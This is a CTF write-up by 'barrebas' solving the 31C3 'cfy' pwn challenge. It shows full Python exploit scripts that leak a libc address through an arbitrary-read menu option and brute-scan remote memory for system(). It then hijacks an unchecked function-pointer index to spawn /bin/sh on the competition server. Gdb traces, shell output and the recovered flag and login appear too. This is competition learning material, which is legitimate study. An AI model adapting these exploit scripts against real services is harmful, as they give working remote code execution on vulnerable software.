### Solved by barrebas

Let's have a look at 31C3's `cfy`. We're given the binary and a place to connect to. Upon connecting with `nc`, we see the following:

```bash
bas@tritonal:~/tmp/31c3$ nc 188.40.18.73 3313
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
```

With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak `libc` address from the got:

```python
#!/usr/bin/python

import struct 
import time
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))


def p(x):
    return struct.pack("L", x)

addr = 0x601020

payload = ""
payload += "2\n"
payload += p(addr)  # printf
payload += "\n"

print s.recv(1000)
s.send(payload)
time.sleep(0.5)
print s.recv(1000)
```

Given us the ouput:

```bash
bas@tritonal:~/tmp/31c3/cfy$ python read.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140512731112416
hex: 0x7fcbab6ca3e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
```

Unfortunately, running the python script again shows a different output value. This means that ASLR is enabled. Furthermore, I didn't know what version of `libc` was running!

I turned my attention to gaining code execution. This was more trivial, although it wasn't a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:


```
  4008af: 48 c1 e0 04           shl    rax,0x4         ; multiply value by 16
  4008b3: 48 05 80 10 60 00     add    rax,0x601080    ; address of parsers, see below
  4008b9: 48 8b 00              mov    rax,QWORD PTR [rax]
  4008bc: bf e0 10 60 00        mov    edi,0x6010e0    ; address of buf, see below
  4008c1: ff d0                 call   rax             ; gain code exec here!
```

There is no check performed on the value in `rax`. If we pass in a normal value, like `2`, the binary fetches the corresponding parser here:

```
gdb-peda$ p parsers
$1 = { {
    fn = 0x40073d <from_hex>, 
    desc = 0x4009b4 "parse from hex"
  }, {
    fn = 0x400761 <from_dec>, 
    desc = 0x4009c3 "parse from dec"
  }, {
    fn = 0x400785 <from_ptr>, 
    desc = 0x4009d2 "parse from pointer"
  } }
```

But look here: `buf` is almost right behind `parsers`:

```  
gdb-peda$ x/40wx parsers
0x601080 <parsers>:             0x0040073d  0x00000000  0x004009b4  0x00000000
0x601090 <parsers+16>:          0x00400761  0x00000000  0x004009c3  0x00000000
0x6010a0 <parsers+32>:          0x00400785  0x00000000  0x004009d2  0x00000000
0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
0x6010c0 <stdout@@GLIBC_2.2.5>: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
0x6010d0 <completed.6972>:      0x00000000  0x00000000  0x00000000  0x00000000
0x6010e0 <buf>:                 0x00000000  0x00000000  0x00000000  0x00000000
0x6010f0 <buf+16>:              0x00000000  0x00000000  0x00000000  0x00000000
0x601100 <buf+32>:              0x00000000  0x00000000  0x00000000  0x00000000
0x601110 <buf+48>:              0x00000000  0x00000000  0x00000000  0x00000000
```

If we somehow load `buf` with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the `buf` section and we have control over execution:

```bash
gdb-peda$ r
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
7   # give bigger number!

Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x6161616161616161 ('aaaaaaaa')
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x6010e0 ('a' <repeats 52 times>, "\n")
RSI: 0x7ffff7ff7035 --> 0x0 
RDI: 0x6010e0 ('a' <repeats 52 times>, "\n")
RBP: 0x7fffffffe4b0 --> 0x0 
RSP: 0x7fffffffe4a0 --> 0x7ffffe590 
...snip...
[-------------------------------------code-------------------------------------]
   0x4008b3 <main+167>: add    rax,0x601080
   0x4008b9 <main+173>: mov    rax,QWORD PTR [rax]
   0x4008bc <main+176>: mov    edi,0x6010e0
=> 0x4008c1 <main+181>: call   rax
   0x4008c3 <main+183>: mov    QWORD PTR [rbp-0x8],rax
   0x4008c7 <main+187>: mov    rax,QWORD PTR [rbp-0x8]
   0x4008cb <main+191>: mov    rsi,rax
   0x4008ce <main+194>: mov    edi,0x400a3d
Guessed arguments:
arg[0]: 0x6010e0 ('a' <repeats 52 times>, "\n")
..snip...
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004008c1 in main ()
```

Excellent. Now what pointer should we store in `buf`? I couldn't make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to `system()` with `/bin/sh` as argument. But where was `system()` located?

I had no idea what `libc` version was running. I did have an arbitrary read primitive though. I had downloaded `libc-2.19` and from the addresses of `printf` and `puts` (both available in the GOT) I deduced that this *wasn't* the correct version. However, I decided to scan the remote binary's libc for signature bytes of `system()`. I assumed it started with these bytes:

```
bas@tritonal:~/tmp/31c3/cfy$ gdb ./libc-2.19.so 
GNU gdb (GDB) 7.4.1-debian
...snip...
gdb-peda$ x/8b system
0x46530 <system>:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
```

So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for `ff85` in the output. 

```python
#!/usr/bin/python

import struct, time, re

def p(x):
    return struct.pack("L", x)

payload = ""
payload += "2\n"
payload += p(0x601020)  # printf
payload += "\n"

import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(1.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

OFFSET=63580    # guesstimated from real libc
for i in range(5000):
    payload = ""
    payload += "2\n"
    payload += p(int(PRINTF, 16)-OFFSET-i)
    payload += "\n"

    s.send(payload)

    data = s.recv(200)
    print data
    print i

    if 'ff85' in data: # part of test rdi, rdi
            print "[!] found possible offset for system(): printf-%d" % (int(PRINTF,16)-(int(PRINTF, 16)-OFFSET-i))
            print "[!] system @ %s" % hex(int(PRINTF, 16)-OFFSET-i)
            raw_input()
```

It gave a lot of possible addresses, and once I thought I had `system()` but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:

```
...snip...
85
[!] found possible offset for system(): printf-63665
[!] system @ 0x7f4df0086b2f


Please enter your number: dec: 2803784840145881088
hex: 0x26e90b74ff854800

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

86
[!] found possible offset for system(): printf-63666
[!] system @ 0x7f4df0086b2e
```

At `printf-63665`, libc indeed has the first few bytes of `system()`. It started with a `00` byte, so I decreased the value by one and plugged that value into a script.


```python
#!/usr/bin/python

import struct, time, re, telnetlib, socket

def p(x):
    return struct.pack("L", x)

# leak printf address in libc via GOT pointer
payload = ""
payload += "2\n"
payload += p(0x601020)  # printf@plt
payload += "\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(0.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

print "[+] found printf: %x" % int(PRINTF, 16)
SYSTEM = int(PRINTF, 16) - 63664
print "[+] system at %x" % int(SYSTEM)

# spam system into buf
payload = ""
payload += "1\n"        
payload += p(SYSTEM)    # address of system() will be stored in buf
payload += p(SYSTEM)    # buf+8
payload += p(SYSTEM)    # buf+16
payload += "\n"

s.send(payload)
print s.recv(200)

payload = ""
payload += "7\n"        # use an address further into buf (parsers+7*16)
payload += "/bin/sh\n"  # because this will overwrite the first few bytes

s.send(payload)         # send payload, causing it to call system('/bin/sh')

t = telnetlib.Telnet()  # interact with spawned shell
t.sock = s
t.interact()
```

I ran the script and crossed my fingers:

```bash
bas@tritonal:~/tmp/31c3/cfy$ python exploit.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140686779126752
hex: 0x7ff4317e93e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

[+] found printf: 7ff4317e93e0
[+] system at 7ff4317d9b30

Please enter your number: 
dec: 0
hex: 0x0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

Please enter your number: id
uid=1001(cfy) gid=1001(cfy) groups=1001(cfy)
cat /home/cfy/flag
THANK YOU WARIO!

BUT OUR PRINCESS IS IN
ANOTHER CASTLE!

Login: cfy_pwn // 31C3_G0nna_keep<on>grynding
```

So the flag was `31C3_G0nna_keep<on>grynding`. I thought this was quite tough based on the amount of points...

